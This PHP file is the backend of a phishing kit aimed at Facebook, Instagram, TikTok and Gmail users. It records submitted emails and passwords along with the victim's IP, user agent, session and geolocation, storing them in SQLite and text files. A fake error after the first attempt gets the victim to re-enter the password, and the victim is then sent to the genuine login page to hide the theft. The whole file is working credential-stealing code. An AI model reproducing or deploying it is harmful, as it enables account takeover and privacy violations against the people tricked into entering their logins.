<?php
session_start();
class AdvancedCredentialManager {
    private $platformCode;
    private $platformName;
    private $captureDir;
    private $dbFile;
    public function __construct($platform) {
        $this->platformName = $platform;
        $codes = ['facebook'=>'FB','instagram'=>'INS','tiktok'=>'TK','gmail'=>'GML'];
        $this->platformCode = $codes[$platform] ?? 'UNK';
        $this->captureDir = '../../captures/' . $this->platformCode;
        if (!file_exists($this->captureDir)) mkdir($this->captureDir, 0755, true);
        $this->dbFile = $this->captureDir . '/' . $this->platformCode . '_credentials.db';
        $this->initializeDatabase();
    }
    private function initializeDatabase() {
        try {
            $db = new SQLite3($this->dbFile);
            $db->exec('CREATE TABLE IF NOT EXISTS ' . $this->platformCode . '_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                email TEXT,
                password TEXT,
                password_confirmed TEXT,
                ip_address TEXT,
                user_agent TEXT,
                geolocation TEXT,
                session_id TEXT,
                attempt_count INTEGER,
                is_confirmed BOOLEAN,
                capture_file TEXT
            )');
            $db->close();
        } catch (Exception $e) {}
    }
    private function getClientIP() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        $headers = ['HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR'];
        foreach ($headers as $h) if (isset($_SERVER[$h])) { $ip = explode(',',$_SERVER[$h])[0]; break; }
        return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'Unknown';
    }
    private function getGeolocation($ip) {
        if (in_array($ip,['Unknown','127.0.0.1','::1'])) return 'Localhost';
        $cacheFile = $this->captureDir . '/geo_cache.json';
        $cache = file_exists($cacheFile) ? json_decode(file_get_contents($cacheFile),true) : [];
        if (isset($cache[$ip])) return $cache[$ip];
        $geo = @file_get_contents("http://ip-api.com/json/".$ip);
        if ($geo) {
            $data = json_decode($geo, true);
            if ($data['status']=='success') {
                $loc = $data['city'].', '.$data['country'];
                $cache[$ip] = $loc;
                file_put_contents($cacheFile, json_encode($cache));
                return $loc;
            }
        }
        return 'Unknown';
    }
    public function processCapture($email, $password, $attempt) {
        $ip = $this->getClientIP();
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $sid = session_id();
        $geo = $this->getGeolocation($ip);
        $ts = date('Ymd_His');
        $txtFile = $this->captureDir . '/' . $this->platformCode . '_' . $ts . '_attempt' . $attempt . '.txt';
        if ($attempt == 1) {
            $content = "=== FIRST ATTEMPT ===\nEmail: $email\nPass: $password\nIP: $ip\nUA: $ua\nGeo: $geo\n";
            file_put_contents($txtFile, $content);
            $_SESSION['fb_email'] = $email;
            $_SESSION['fb_pass1'] = $password;
            try {
                $db = new SQLite3($this->dbFile);
                $stmt = $db->prepare('INSERT INTO '.$this->platformCode.'_credentials (email,password,ip_address,user_agent,geolocation,session_id,attempt_count,is_confirmed,capture_file) VALUES (:e,:p,:ip,:ua,:geo,:sid,1,0,:file)');
                $stmt->bindValue(':e',$email); $stmt->bindValue(':p',$password); $stmt->bindValue(':ip',$ip); $stmt->bindValue(':ua',$ua); $stmt->bindValue(':geo',$geo); $stmt->bindValue(':sid',$sid); $stmt->bindValue(':file',basename($txtFile));
                $stmt->execute(); $db->close();
            } catch(Exception $e){}
            return ['status'=>'first','redirect'=>true];
        } else {
            $pass1 = $_SESSION['fb_pass1'] ?? '';
            $confirmed = ($password === $pass1);
            $content = "=== CONFIRMED ATTEMPT ===\nEmail: $email\nPass: $password\nFirst Pass: $pass1\nMatch: ".($confirmed?'YES':'NO')."\nIP: $ip\nUA: $ua\nGeo: $geo\n";
            file_put_contents($txtFile, $content);
            try {
                $db = new SQLite3($this->dbFile);
                $stmt = $db->prepare('INSERT INTO '.$this->platformCode.'_credentials (email,password,password_confirmed,ip_address,user_agent,geolocation,session_id,attempt_count,is_confirmed,capture_file) VALUES (:e,:p,:pc,:ip,:ua,:geo,:sid,2,:conf,:file)');
                $stmt->bindValue(':e',$email); $stmt->bindValue(':p',$pass1); $stmt->bindValue(':pc',$password); $stmt->bindValue(':ip',$ip); $stmt->bindValue(':ua',$ua); $stmt->bindValue(':geo',$geo); $stmt->bindValue(':sid',$sid); $stmt->bindValue(':conf',$confirmed?1:0,SQLITE3_INTEGER); $stmt->bindValue(':file',basename($txtFile));
                $stmt->execute(); $db->close();
                if ($confirmed) {
                    $sum = $this->captureDir.'/CONFIRMED_SUMMARY.txt';
                    file_put_contents($sum, "✅ CONFIRMED | $email | $password | ".date('Y-m-d H:i:s')."\n", FILE_APPEND);
                }
            } catch(Exception $e){}
            session_destroy();
            return ['status'=>'confirmed','redirect'=>true];
        }
    }
    public function redirectLegit() {
        $map = ['facebook'=>'https://www.facebook.com/login/','instagram'=>'https://www.instagram.com/accounts/login/','tiktok'=>'https://www.tiktok.com/login/','gmail'=>'https://accounts.google.com/signin/v2/identifier?service=mail'];
        header('Location: '.($map[$this->platformName]??'https://google.com'));
        exit;
    }
}
if ($_SERVER['REQUEST_METHOD']==='POST') {
    $platform = $_POST['platform'] ?? 'facebook';
    $email = $_POST['email'] ?? '';
    $pass = $_POST['pass'] ?? '';
    $attempt = isset($_POST['attempt']) ? (int)$_POST['attempt'] : 1;
    if ($email && $pass) {
        $mgr = new AdvancedCredentialManager($platform);
        $result = $mgr->processCapture($email, $pass, $attempt);
        if ($attempt == 1) {
            header('Location: index.html?error=1&email='.urlencode($email));
            exit;
        } else {
            $mgr->redirectLegit();
        }
    }
}
header('Location: index.html');
exit;
?>